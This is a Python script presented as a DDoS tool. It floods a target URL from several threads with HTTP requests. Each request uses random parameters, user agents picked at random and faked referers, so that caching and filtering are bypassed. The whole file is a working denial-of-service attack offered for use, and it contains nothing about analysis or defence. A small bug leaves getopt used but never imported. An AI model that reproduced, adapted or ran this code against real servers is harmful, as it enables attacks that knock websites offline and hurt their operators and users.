#!/usr/bin/python

import os
import re
import sys
import time
import signal
import random
import urllib2
import threading

def usage():
    print('  #######################')
    print('  # DDos URL by.13allno #')
    print('  #######################')
    print('python attack.py [-t] [-c] <URL>\n-t : time\n-c : thread')
    sys.exit()

# Generates a user agent array
def useragent_list():
    return [
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51'
    ]

# Generates a referer array
def referer_list():
    return [
        'http://{}/'.format(host),
        'http://www.usatoday.com/search/results?q=',
        'http://engadget.search.aol.com/search?q='
    ]

def handler(signum, _):
    if signum == signal.SIGALRM:
        print("Time is up!")
        print("Attack finished!")
    sys.exit()

# Builds random ASCII string
def buildblock(size):
    return ''.join(chr(random.randint(65, 90)) for _ in range(size))

def send_packet(host, param_joiner):
    url_params = "{}{}{}={}".format(url, param_joiner, buildblock(random.randint(3, 10)), buildblock(random.randint(3, 10)))
    headers = {
        'User-Agent': random.choice(useragent_list()),
        'Cache-Control': 'no-cache',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Referer': '{}{}'.format(random.choice(referer_list()), buildblock(random.randint(5, 10))),
        'Keep-Alive': str(random.randint(110, 120)),
        'Connection': 'keep-alive',
        'Host': host
    }

    try:
        response = urllib2.urlopen(urllib2.Request(url_params, headers=headers))
    except urllib2.HTTPError:
        pass
    except urllib2.URLError:
        pass

def attack(host, param_joiner):
    while True:
        send_packet(host, param_joiner)

def parse_parameters(parameters):
    global url, interval, num_thread
    interval_def = 30
    num_thread_def = 5
    interval, num_thread = interval_def, num_thread_def

    try:
        opts, args = getopt.getopt(parameters, "ht:c:", ["help"])
        url = args[0]

        for opt, arg in opts:
            if opt in ('-h', '--help'):
                usage()
            elif opt in ('-t', '--time'):
                interval = int(arg)
            elif opt in ('-c', '--count'):
                num_thread = int(arg)

    except (getopt.GetoptError, ValueError):
        print("Invalid option or value!")
        usage()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
        sys.exit()

    parse_parameters(sys.argv[1:])
    print("   Attack : thread={} time={} {}".format(num_thread, interval, url))

    if url.count('/') == 2:
        url = url + "/"

    m = re.search('http://([^/]*)/?.*', url)

    try:
        host = m.group(1)
    except AttributeError:
        usage()

    useragent_list()
    referer_list()

    param_joiner = "&" if url.count("?") > 0 else "?"

    signal.signal(signal.SIGINT, handler)
    signal.signal(signal.SIGALRM, handler)
    signal.alarm(interval)

    threads = []

    for _ in range(num_thread):
        thread = threading.Thread(target=attack, args=(host, param_joiner))
        thread.daemon = True
        threads.append(thread)
        thread.start()

    time.sleep(interval)
    signal.alarm(0)

    print("Main thread exit...")
